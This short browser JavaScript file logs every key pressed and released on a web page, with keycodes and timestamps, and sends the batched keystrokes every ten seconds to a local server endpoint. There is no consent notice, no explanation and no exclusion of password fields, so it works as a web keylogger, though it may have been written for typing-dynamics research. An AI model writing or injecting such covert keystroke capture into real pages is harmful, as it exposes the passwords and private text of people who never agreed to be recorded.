document.addEventListener("DOMContentLoaded", function () {
    let keystrokes = [];

    document.addEventListener("keydown", function (event) {
        let timestamp = Date.now();
        keystrokes.push({
            key: event.key,
            keyCode: event.keyCode,
            type: "keydown",
            timestamp: timestamp
        });
    });

    document.addEventListener("keyup", function (event) {
        let timestamp = Date.now();
        keystrokes.push({
            key: event.key,
            keyCode: event.keyCode,
            type: "keyup",
            timestamp: timestamp
        });
    });

    setInterval(() => {
        if (keystrokes.length > 0) {
            fetch("http://localhost:8080/save_keystrokes", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ keystrokes: keystrokes })
            });
            keystrokes = []; // Clear buffer
        }
    }, 10000);
});
